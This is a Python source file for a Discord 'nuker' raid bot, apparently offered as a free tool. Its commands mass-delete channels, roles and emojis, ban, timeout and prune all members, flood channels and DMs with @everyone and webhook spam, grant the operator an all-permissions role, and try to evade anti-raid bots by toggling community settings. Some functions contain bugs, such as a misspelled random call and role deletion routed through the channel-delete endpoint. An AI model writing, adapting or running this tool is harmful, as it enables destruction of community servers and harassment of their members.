#!/usr/bin/python
# coding:utf-8

import os, sys
from pystyle import Colors, Colorate

os.system("title TrydaX Tool Nuker | Made By Trydax")

modules = ["discord.py", "timedelta", "requests", "pystyle", "asyncio"]
try:
    import discord
    import asyncio
    import requests
    import datetime, timedelta
    from pystyle import Colors, Colorate
except ImportError:
    print(Colorate.Horizontal(Colors.purple_to_blue, " [!] Checking if you have the modules installed. . .", 1, 0))
    for libraries in modules:
      if sys.platform == "win32":
        os.system(f"py -3 -m pip install -U {libraries}")
      else:
        os.system(f"pip install {libraries}")

os.system("cls")

#-----------------------[Library]----------------------- [Made By Trydax]
import random, json, threading, time, base64, os, sys
from discord.ext import tasks, commands
from discord.ext.commands import Bot
from discord import Permissions
from discord.ext import commands

#-----------------------[JSON Library]----------------------- [Made By Trydax]
with open("config.json", "r", encoding='utf-8') as f:
    data = json.load(f)

token = data["token"]
prefix = data["prefix"]
owner = data["owner"]
estado = data["status"]
cchannel = data["channel_name"]
croles = data["roles_name"]
topic = data["topic_textchannel"]
sd = data["sv_description"]
razon = data["reason"]
icono = data["server_icon"]
nombre = data["server_name"]
cartel = data["server_banner"]
ms = data["dm_send"]
wbk = data["webhook_send"]
wuser = data["webhook_username"]

with open("embed.json", "r", encoding='utf-8') as f:
    data = json.load(f)

msg = data["content"]
titulo = data["e_title"]
descripcion = data["e_description"]
url = data["e_url"]
letrin = data["e_footer"]
gif = data["image_embed"]

with open("invitebot.json", "r", encoding='utf-8') as f:
    data = json.load(f)

wbi = data["webhook_id"]
wbt = data["webhook_token"]

#-----------------------[Setup]----------------------- [Made By Trydax]
bot = commands.Bot (command_prefix = prefix, intents = discord.Intents.all(), help_command = None)

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

Banner = """


                    ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                       ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                       ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                       ░▒▓█▓▒░   ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░  
                       ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                       ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                       ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 

   
"""

def TT():
  clear()
  print(Colorate.Vertical(Colors.red_to_blue, Banner, 1))
  print(Colorate.Horizontal(Colors.red_to_blue, f"""
                                               TrydaX NUKER (BEAST)
                                     --------------------------------------   
                                       Cliente iniciado: {bot.user}
                                       ID: {bot.user.id}
                                       VERSION: Commands v1.0 [Free]
                                       SERVERS: {str(len(bot.guilds))}
                                       CREDITS: Made By Trydax
                                       HELP: {prefix}help
                                     --------------------------------------  
    """))

#-----------------------[Status]----------------------- [Made By Trydax]
wbs = discord.SyncWebhook.partial(int(wbi), f'{wbt}')
@bot.event
async def on_ready():
  try:
   await bot.change_presence(status=discord.Status.online, activity=discord.Game(name=estado))
   await wbs.send(f"BOT INVITE: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=53608447&integration_type=0&scope=bot")
  except:
     pass
  TT()

#-----------------------[SubJSON]----------------------- [Made By Trydax]
time = (datetime.datetime.utcnow()).isoformat()

members = open('Setup/ids.txt')

#-----------------------[Events]----------------------- [Made By Trydax]
@ bot.event
async def on_guild_join (guild):
  invite = None
  for channel in guild.text_channels:
    try:
      invite = await channel.create_invite()
      break
    except:
      continue

  if invite == None:
    msg = f"Joined {guild.name} with {guild.member_count} Members and couldn't create an invite link."
  else:
    msg = f"Joined {guild.name} with {guild.member_count} Members. Invite: {invite}"

  print(Colorate.Horizontal(Colors.green_to_blue, msg))

if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

sessions = requests.Session()

#-----------------------[Help 🇪🇸]----------------------- [Made By Trydax]
@bot.command()
async def ayuda(ctx): 
 if ctx.author.id in owner:
   try:
     user = ctx.author
     await ctx.message.delete()
   except:
      pass
   aembed = discord.Embed(title="`💣` LISTA DE COMANDOS DESTRUCTIVOS `💣`", description=f"""
  ```💣 -> {prefix}fuck = Elimina todos los canales + crea muchos canales basura

🔊 -> {prefix}vc = Elimina todos los canales + crea 1 canal de texto y muchos canales de voz

⛔ -> {prefix}prune = Suprime a los miembros por 1 dia de inactividad

🛡 -> {prefix}bypass = Crea canales que logran evadir las detecciones de bots antiraids

✉ -> {prefix}spam = Inunda todos los canales con alertas

🖍 -> {prefix}rchannel = Edita todos los canales del servidor

✏ -> {prefix}rroles = Edita todos los roles del servidor

📪 -> {prefix}md = Manda mensajes al privado de todos los miembros

💩 -> {prefix}efuck = Elimina todos los emojis que tiene el servidor

⚡ -> {prefix}adm = Te otorga un rol con todos los permisos

🧨 -> {prefix}cfuck = Elimina todos los canales que tiene el servidor

🚩 -> {prefix}rfuck = Elimina todos los roles que tiene el servidor

🗑 -> {prefix}emojis = Crea muchos emojis basura

🛠 -> {prefix}sfuck = Edita la presentación del servidor (nombre, icono, etc)

🔇 -> {prefix}mute = Manda aislamiento a todos los miembros del servidor

🚫 -> {prefix}ban = Banea a todos los miembros debajo del bot

🤖 -> {prefix}wspam = Inunda todos los canales con webhooks

👻 -> {prefix}leave = El bot abandona el servidor automaticamente

⏲ -> {prefix}testbb = Prueba la velocidad del baneo masivo```""", color = 0x0a0bf0)#[Made By Trydax]
   aembed.set_image(url="https://i.imgur.com/pWWDOUf.gif")
   msg = await user.send(embed=aembed)#[Made By Trydax]
   await asyncio.sleep(50)#[Made By Trydax]
   await msg.delete()#[Made By Trydax]
 else:#[Made By Trydax]
   embedc = discord.Embed(description="`| NO TIENE PERMISOS PARA USAR ESTE BOT`")#[Made By Trydax]
   await ctx.send(embed=embedc)#[Made By Trydax]

#-----------------------[Help 🇺🇸]----------------------- [Made By Trydax]
@bot.command()
async def help(ctx): 
 if ctx.author.id in owner:
   try:
     user = ctx.author
     await ctx.message.delete()
   except:
      pass
   aembed = discord.Embed(title="`💣` LIST OF DESTRUCTIVE COMMANDS `💣`", description=f"""
  ```💣 -> {prefix}fuck = Delete all channels + create many junk channels

🔊 -> {prefix}vc = Delete all channels + create 1 text channel and many voice channels

⛔ -> {prefix}prune = Remove members for 1 day of inactivity

🛡 -> {prefix}bypass = Create channels that manage to evade anti-raid bot detections

✉ -> {prefix}spam = Flood all channels with alerts

🖍 -> {prefix}rchannel = Edit all server channels

✏ -> {prefix}rroles = Edit all server roles

📪 -> {prefix}md = Send private messages to all members

💩 -> {prefix}efuck = Delete all the emojis that the server has

⚡ -> {prefix}adm = Gives you a role with all permissions

🧨 -> {prefix}cfuck = Delete all the channels that the server has

🚩 -> {prefix}rfuck = Remove all roles that the server has

🗑 -> {prefix}emojis = Create lots of trash emojis

🛠 -> {prefix}sfuck = Edit the server presentation (name, icon, etc.)

🔇 -> {prefix}mute = Send isolation to all members of the server

🚫 -> {prefix}ban = Ban all members under the bot

🤖 -> {prefix}wspam = Flood all channels with webhooks

👻 -> {prefix}leave = The bot leaves the server automatically

⏲ -> {prefix}testbb = Test the speed of mass ban```""", color = 0x0a0bf0)#[Made By Trydax]
   aembed.set_image(url="https://i.imgur.com/pWWDOUf.gif")
   msg = await user.send(embed=aembed)#[Made By Trydax]
   await asyncio.sleep(50)#[Made By Trydax]
   await msg.delete()#[Made By Trydax]
 else:#[Made By Trydax]
   embedc = discord.Embed(description="`| NO TIENE PERMISOS PARA USAR ESTE BOT`")#[Made By Trydax]
   await ctx.send(embed=embedc)#[Made By Trydax]

#-----------------------[Requests]----------------------- [Made By Trydax]

#[Community Disable][Made By Trydax]
def disable_community(guild):
   payload = {
      "description": f"{random.choice(sd)}",
      "features": ["NEWS"],
      "preferred_locale": "en-US",
      "rules_channel_id": None,
      "public_updates_channel_id": None
    }
   r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=payload)
   if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.green_to_blue, f"[!] Disabled Community Server Successfully"))
   else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Failed Disabled Community Server | Error {r.status_code}"))
   if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Active Comunity][Made By Trydax]
def active_community(guild):
   payload = {
      "features": ["NEWS", "COMMUNITY"],
      "description": f"{random.choice(sd)}",
      "preferred_locale": "en-US",
      "rules_channel_id": 1,
      "public_updates_channel_id": 1,
      "verification_level": 1,
      "explicit_content_filter": 2
               }
   r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=payload)
   if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.yellow_to_green, f"[!] Active Community Server Successfully"))
   else:
      print(Colorate.Horizontal(Colors.yellow_to_red, f"[!] Failed Active Community Server | Error {r.status_code}"))
   if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Edit Guild][Made By Trydax]
def edit_guild(guild):
   x = base64.b64encode(requests.get(icono).content).decode()
   y = base64.b64encode(requests.get(cartel).content).decode()
   payload = {
      "name": f"{nombre}",
      "icon": f"data:image/gif;base64,{x}",
      "banner": f"data:image/gif;base64,{x}",
      "splash" : f"data:image/png;base64,{y}",
      "discovery_splash": f"data:image/png;base64,{y}",
      "premium_progress_bar_enabled": None,
      "verification_level": 0
   }
   r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=payload)
   if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.yellow_to_green, f"[!] Editing Server Successfully"))
   else:
      print(Colorate.Horizontal(Colors.yellow_to_red, f"[!] Failed Editing Server | Error {r.status_code}"))
   if r.status_code == 429:
     b = r.json()['retry']
     time.sleep(b['retry_after'])

#[Channels Delete][Made By Trydax]
def delete_channels(channel_id):
     r = sessions.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
     if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      channel = r.json() ['name']
      id = r.json() ['id']
      print (Colorate.Horizontal(Colors.green_to_yellow, f"[!] Deleted Channel {channel} With ID {id}"))
     else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Failed Deleted Channel {channel} With ID {id} | Error {r.status_code}"))
     if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Create Channels][Made By Trydax]
def create_channels(guild_id):
     json = {
          "name": f"{random.choice(cchannel)}",
          "topic": f"{random.choice(topic)}"
            }
     r = sessions.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=json)
     if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
       channel = r.json()['name']
       id = r.json()['id']
       print(Colorate.Horizontal(Colors.green_to_white, f"[!] Created Channel {channel} With ID {id}"))
     else:
       print(Colorate.Horizontal(Colors.red_to_white, f"[!] Failed Created Channel | Error {r.status_code}"))
     if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Channels Voice Create][Made By Trydax]
def create_voice(guild_id):
     json = {
          "name": f"{random.choice(cchannel)}",
          "type": 2
     }
     r = sessions.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=json)
     if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
       channel = r.json()['name']
       id = r.json()['id']
       print(Colorate.Horizontal(Colors.green_to_white, f"[!] Created Voice Channel {channel} With ID {id}"))
     else:
       print(Colorate.Horizontal(Colors.red_to_white, f"[!] Failed Created Voice Channel | Error {r.status_code}"))
     if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Create Roles][Made By Trydax]
def create_roles(guild_id):
     json = {
          "name": f"{random.choice(croles)}",
          "color": random.randint(0, 0xffffff)
     }
     r = sessions.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=json)
     if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
       role = r.json()['name']
       id = r.json()['id']
       print(Colorate.Horizontal(Colors.green_to_white, f"[!] Created Roles {role} With ID {id}"))
     else:
       print(Colorate.Horizontal(Colors.red_to_white, f"[!] Failed Created Roles | Error {r.status_code}"))
     if r.status_code == 429:
      b = r.json()['retry']
      time.sleep(b['retry_after'])

#[Prune Members][Made By Trydax]
def prune_members(guild_id):
    payload = {
            "days": 1,
            "reason": f"{random.choice(razon)}"
        }
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/prune", headers=headers, json=payload)
    p = r.json()['pruned']
    if r.status_code == 200:
            print(Colorate.Horizontal(Colors.green_to_blue, f"[!] Pruned {p} Members Successfully"))
    else:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[!] Failed Prune Members | Error {r.status_code}"))
    if r.status_code == 429:
     b = r.json()['retry']
     time.sleep(b['retry_after'])

#[Bypass Anti-Raid][Made By Trydax]
def fuck_community(guild):
    a = {
      "description": None,
      "features": ["NEWS"],
      "preferred_locale": "en-US",
      "rules_channel_id": None,
      "public_updates_channel_id": None
    }
    a2 = {
      "features": ["NEWS"],
      "preferred_locale": "en-US",
      "rules_channel_id": "1",
      "public_updates_channel_id": "1"
    }
    for i in range (12): 
      try:
        r = sessions.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a2)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
          print(Colorate.Horizontal(Colors.green_to_blue, f"[!] Active Community Channels"))
        else:
          print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Failed Active Community Channels | Error {r.status_code}"))
        if r.status_code == 429:
         b = r.json()['retry']
         time.sleep(b['retry_after'])
      except:
        pass
      try:
        r = sessions.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
          print(Colorate.Horizontal(Colors.green_to_blue, f"[!] Disabled Community Channels"))
        else:
          print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Failed Disabled Community Channels | Error {r.status_code}"))
        if r.status_code == 429:
         b = r.json()['retry']
         time.sleep(b['retry_after'])
      except:
        pass

#[Spam Channels][Made By Trydax]
def mass_ping(channel_id):
      time = (datetime.datetime.utcnow()).isoformat()
      json = {
        "content": f"@everyone {msg}",
        "embeds": [
                {
                    "title": f"{titulo}",
                    "description": f"{descripcion}",
                    "url": f"{url}",
                    "color": random.ranint(0, 0xffffff),
                    "timestamp": time,
                    "image": { "url": f"{random.choice(gif)}"},
                    "footer": { "text": f"{letrin}"}
                }
      ],
       "tts": False
    }
      r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=json)
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
       o = r.json()['content']
       id = r.json()['id']
       print(Colorate.Horizontal(Colors.green_to_white, f"[!] Spammed Message '{o}' With ID {id}"))
      else:
       print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Falled Spammed Message | Error {r.status_code}"))
      if r.status_code == 429:
         b = r.json()['retry']
         time.sleep(b['retry_after'])

#[Rename Channels][Made By Trydax]
def channels_update(channel_id):
  if channel_id == discord.TextChannel:
    payload = {
        "name": f"{random.choice(cchannel)}",
        "permission_overwrites": [],
        "topic": f"{random.choice(topic)}"
   }
    r = requests.patch(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers, json=payload)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      channel = r.json()['name']
      id = r.json()['id']
      print(Colorate.Horizontal(Colors.green_to_white, f"[!] Update Channel {channel} With ID {id}"))
    else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Falled Update Channel {channel} | Error {r.status_code}"))
  else:
    payload = {
        "name": f"{random.choice(cchannel)}",
        "permission_overwrites": []
   }
    r = requests.patch(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers, json=payload)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      channel = r.json()['name']
      id = r.json()['id']
      print(Colorate.Horizontal(Colors.green_to_white, f"[!] Update Channel {channel} With ID {id}"))
    else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Falled Update Channel {channel} | Error {r.status_code}"))

#[Rename Roles][Made By Trydax]
def roles_update(guild_id, role_id):
    payload = {
        "name": f"{random.choice(croles)}",
        "color": random.randint(0, 0xffffff)
              }
    r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers, json=payload)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.green_to_white, f"[!] Update Role With ID {role_id}"))
    else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Falled Update Role With ID {role_id} | Error {r.status_code}"))

#[Delete Emojis][Made By Trydax]
def emojis_fuck(guild_id, emoji_id):
   r = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji_id}", headers=headers)
   if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.green_to_blue, f"[!] Deleted Emoji With ID {emoji_id}"))
   else:
      print(Colorate.Horizontal(Colors.red_to_yellow, f"[!] Falled Deleted Emoji With ID {emoji_id} | Error {r.status_code}"))

#[Create Emojis][Made By Trydax]
def create_emojis(guild_if):
    encode = base64.b64encode(requests.get("https://cdn.discordapp.com/attachments/1010398756451139584/1189364177534455849/OIP_1.jpg").content).decode()
    payload = {
      "name" : "Elementals_Fucked",
      "image": f"data:image/png;base64,{encode}"
    }
    r = sessions.post(f"https://discord.com/api/v9/guilds/{guild_if}/emojis", headers=headers, json=payload)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
     emote = r.json()['name']
     id = r.json()['id']
     print(Colorate.Horizontal(Colors.blue_to_purple, f"[!] Create Emote :{emote}: With ID {id}"))
    else:
     print(Colorate.Horizontal(Colors.red_to_black, f"[!] Falled Create Emote | Error {r.status_code}"))

#[Timeout Members][Made By Trydax]
def timeout_all(guild, memberid):
   timeout = (datetime.datetime.utcnow() + datetime.timedelta(weeks=1)).isoformat()
   json = {
          'communication_disabled_until': timeout,
          'reason': 'TrashedByElementals'
		            }
   r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{memberid}", headers=headers, json=json)
   if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
      print(Colorate.Horizontal(Colors.blue_to_green, f"[!] Muted Member With ID {memberid}"))
   else:
      print(Colorate.Horizontal(Colors.red_to_green, f"[!] Falled Muted Member With ID {r.status_code}"))

#[Ban Members][Made By Trydax]
def mass_ban(guild_id, member_id):
  r = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers, json={'reason': 'Baneado Por TrydaX'})
  if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
   print(Colorate.Horizontal(Colors.green_to_white, f"[!] Banned User With ID {member_id}"))
  else:
    print(Colorate.Horizontal(Colors.red_to_blue, f"[!] Failed Banned User Whit ID {member_id} | Error {r.status_code}"))

#[Webhook Spam][Made By HRCX, Modify By TrydaX]
def webhook_spam(webhook):
    while spammingdawebhookeroos:
        json = {'content': f' @everyone {wbk}', 'username': f'{wuser}'}
            
        spamming = requests.post(webhook, json=json)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            print(Colorate.Horizontal(Colors.green_to_white, f"[!] Spammed Message '@everyone {wbk}'"))
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[!] Falled Spammed Message | Error {spamming.status_code}"))
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

#-----------------------[Commands]----------------------- [Made By Trydax]
#[Raid Command][Made By Trydax]
@bot.command()
async def fuck(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    disable_community(ctx.guild.id)
   except:
      pass
   try:
    edit_guild(ctx.guild.id)
   except:
      pass
   try:
    for channel in ctx.guild.channels:
     threading.Thread(target=delete_channels, args=(channel.id,)).start()
   except:
      pass
   try:
    for i in range(20):
      threading.Thread(target=create_channels, args=(ctx.guild.id,)).start()
   except:
      pass
   try:
    for i in range(20):
      threading.Thread(target=create_roles, args=(ctx.guild.id, )).start()
   except:
      pass
   try:
    for i in range(10):
     for channel in ctx.guild.channels:
       threading.Thread(target=mass_ping, args=(channel.id,)).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[VC Raid Command][Made By Trydax]
@bot.command()
async def vc(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    disable_community(ctx.guild.id)
   except:
      pass
   try:
    for channel in ctx.guild.channels:
     threading.Thread(target=delete_channels, args=(channel.id,)).start()
   except:
      pass
   try:
    for i in range(1):
      threading.Thread(target=create_channels, args=(ctx.guild.id,)).start()
   except:
      pass
   try:
    for i in range(19):
      threading.Thread(target=create_voice, args=(ctx.guild.id, )).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Prune Command][Made By Trydax]
@bot.command()
async def prune(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   prune_members(ctx.guild.id)
   await asyncio.sleep(2)
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Anti-AntiNuke Command][Made By Trydax]
@bot.command()
async def bypass(ctx):
  guild = ctx.guild.id
  if ctx.author.id in owner:
   await ctx.message.delete()
   threading.Thread(target=fuck_community, args=(ctx.guild.id,)).start()
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Spam Command][Made By Trydax]
@bot.command()
async def spam(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for i in range(1):
     for channel in ctx.guild.channels:
       threading.Thread(target=mass_ping, args=(channel.id,)).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)
           
#[Change Channel Name Command][Made By Trydax]
@bot.command()
async def rchannel(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for channel in list(ctx.guild.channels):
      threading.Thread(target=channels_update, args=(channel.id,)).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Change Role Name Command][Made By Trydax]
@bot.command()
async def rroles(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for role in list(ctx.guild.roles):
      threading.Thread(target=roles_update, args=(ctx.guild.id, role.id,)).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[DM Send Command][Made By Trydax]
@bot.command()
async def md(ctx):
      if ctx.author.id in owner:
        await ctx.message.delete()
        for member in ctx.guild.members:
          if not member.id == bot.user.id:
            try:
              dm = await member.create_dm()
              await dm.send(f"{member.mention} {ms}")
              print (Colorate.Horizontal(Colors.green_to_white, f"[+] Message Send {member.display_name} Successfully"))
            except Exception as e:
              print (Colorate.Horizontal(Colors.red_to_blue, f"[-] Message No Send {member.display_name} | Error {e}"))
      else:
         embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
         await ctx.send(embed=embedc)

#[Delete Emoji Command][Made By Trydax]
@bot.command()
async def efuck(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for emote in ctx.guild.emojis:
     threading.Thread(target=emojis_fuck, args=(ctx.guild.id, emote.id, )).start()
     await asyncio.sleep(1)
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Admin Rol Command][Made By Trydax]
@bot.command()
async def adm(ctx):
  if ctx.author.id in owner:
    await ctx.message.delete()
    await ctx.guild.create_role(name='『🍭』', permissions=Permissions.all(), colour = 0xff8900)
    role = discord.utils.get(ctx.guild.roles, name="『🍭』")
    await ctx.author.add_roles(role)
  else:
     embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
     await ctx.send(embed=embedc)

#[Delete Channels Command][Made By Trydax]
@bot.command()
async def cfuck(ctx):
   if ctx.author.id in owner:
    await ctx.message.delete()
    try:
       disable_community(ctx.guild.id)
    except:
       pass
    try:
     for channel in ctx.guild.channels:
      threading.Thread(target=delete_channels, args=(channel.id,)).start()
    except:
       pass
   else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Delete Role Command][Made By Trydax]
@bot.command()
async def rfuck(ctx):
   if ctx.author.id in owner:
    await ctx.message.delete()
    try:
     for roles in ctx.guild.roles:
      threading.Thread(target=delete_channels, args=(roles.id,)).start()
      await asyncio.sleep(1)
    except:
       pass
   else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Create Emojis Command][Made By Trydax]
@bot.command()
async def emojis(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for i in range(10):
      threading.Thread(target=create_emojis, args=(ctx.guild.id, )).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Edit Guild Command][Made By Trydax]
@bot.command()
async def edit(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    edit_guild(ctx.guild.id)
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)  

#[Massmute Command][Made By Trydax]
@bot.command()
async def mute(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
    for member in list(ctx.guild.members):
     threading.Thread(
				  target=timeout_all, 
				  args=(ctx.guild.id, member.id, )
				).start()
     await asyncio.sleep(1)
   except:
     pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Massban Command][Made By Trydax]
@bot.command()
async def ban(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   try:
     for member in list(ctx.guild.members):
       threading.Thread(target=mass_ban, args=(ctx.guild.id, member.id, )).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Spam Webhooks Command][Made By Trydax]
@bot.command()
async def wspam(ctx):
  if ctx.author.id in owner:
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webhook_spam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name="TrydaX")
                threading.Thread(target = webhook_spam, args = (webhook.url,)).start()
                print(f"> Webhook Send")

            except:
                print (f"> Webhook Error")
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)

#[Leave Command][Made By Trydax]
@bot.command()
async def leave(ctx):
  await ctx.message.delete()
  await ctx.guild.leave()

#[Massban Test Command][Made By Trydax]
@bot.command()
async def testbb(ctx):
  if ctx.author.id in owner:
   await ctx.message.delete()
   members = open('Setup/ids.txt')
   try:
     for member in members:
       threading.Thread(target=mass_ban, args=(ctx.guild.id, member, )).start()
   except:
      pass
  else:
      embedc = discord.Embed(description="`| YOU DON'T HAVE PERMISSIONS TO USE THIS BOT`")
      await ctx.send(embed=embedc)
				 
bot.run (token)
